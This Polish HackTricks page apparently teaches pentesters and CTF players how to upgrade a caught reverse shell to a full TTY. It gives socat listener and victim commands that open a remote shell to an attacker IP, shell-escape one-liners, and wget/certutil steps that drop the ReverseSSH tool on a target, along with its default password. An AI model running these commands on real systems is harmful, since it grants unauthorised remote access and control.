# Pełne TTY

{{#include ../../banners/hacktricks-training.md}}

## Pełne TTY

Zauważ, że powłoka, którą ustawiasz w zmiennej `SHELL` **musi** być **wymieniona w** _**/etc/shells**_ lub `Wartość zmiennej SHELL nie została znaleziona w pliku /etc/shells. To zdarzenie zostało zgłoszone`. Ponadto, zauważ, że następne fragmenty działają tylko w bash. Jeśli jesteś w zsh, przełącz się na bash przed uzyskaniem powłoki, uruchamiając `bash`.

#### Python
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'

(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
> [!NOTE]
> Możesz uzyskać **liczbę** **wierszy** i **kolumn** wykonując **`stty -a`**

#### script
```bash
script /dev/null -qc /bin/bash #/dev/null is to not store anything
(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
#### socat
```bash
#Listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444

#Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```
### **Spawn shells**

- `python -c 'import pty; pty.spawn("/bin/sh")'`
- `echo os.system('/bin/bash')`
- `/bin/sh -i`
- `script -qc /bin/bash /dev/null`
- `perl -e 'exec "/bin/sh";'`
- perl: `exec "/bin/sh";`
- ruby: `exec "/bin/sh"`
- lua: `os.execute('/bin/sh')`
- IRB: `exec "/bin/sh"`
- vi: `:!bash`
- vi: `:set shell=/bin/bash:shell`
- nmap: `!sh`

## ReverseSSH

Wygodny sposób na **interaktywny dostęp do powłoki**, a także **transfer plików** i **przekierowywanie portów**, to umieszczenie statycznie powiązanego serwera ssh [ReverseSSH](https://github.com/Fahrj/reverse-ssh) na celu.

Poniżej znajduje się przykład dla `x86` z binariami skompresowanymi za pomocą upx. Dla innych binariów sprawdź [releases page](https://github.com/Fahrj/reverse-ssh/releases/latest/).

1. Przygotuj lokalnie, aby przechwycić żądanie przekierowania portu ssh:
```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -v -l -p 4444
```
- (2a) Cel Linux:
```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -p 4444 kali@10.0.0.2
```
- (2b) Cel Windows 10 (dla wcześniejszych wersji sprawdź [project readme](https://github.com/Fahrj/reverse-ssh#features)):
```bash
# Drop it via your preferred way, e.g.
certutil.exe -f -urlcache https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86.exe reverse-ssh.exe

reverse-ssh.exe -p 4444 kali@10.0.0.2
```
- Jeśli żądanie przekierowania portu ReverseSSH zakończyło się sukcesem, powinieneś teraz móc zalogować się za pomocą domyślnego hasła `letmeinbrudipls` w kontekście użytkownika uruchamiającego `reverse-ssh(.exe)`:
```bash
# Interactive shell access
ssh -p 8888 127.0.0.1

# Bidirectional file transfer
sftp -P 8888 127.0.0.1
```
## Penelope

[Penelope](https://github.com/brightio/penelope) automatycznie aktualizuje odwrotne powłoki Linuxa do TTY, obsługuje rozmiar terminala, rejestruje wszystko i wiele więcej. Oferuje również wsparcie dla readline w powłokach Windows.

![penelope](https://github.com/user-attachments/assets/27ab4b3a-780c-4c07-a855-fd80a194c01e)

## No TTY

Jeśli z jakiegoś powodu nie możesz uzyskać pełnego TTY, **wciąż możesz interagować z programami**, które oczekują na dane wejściowe od użytkownika. W następującym przykładzie hasło jest przekazywane do `sudo`, aby odczytać plik:
```bash
expect -c 'spawn sudo -S cat "/root/root.txt";expect "*password*";send "<THE_PASSWORD_OF_THE_USER>";send "\r\n";interact'
```
{{#include ../../banners/hacktricks-training.md}}
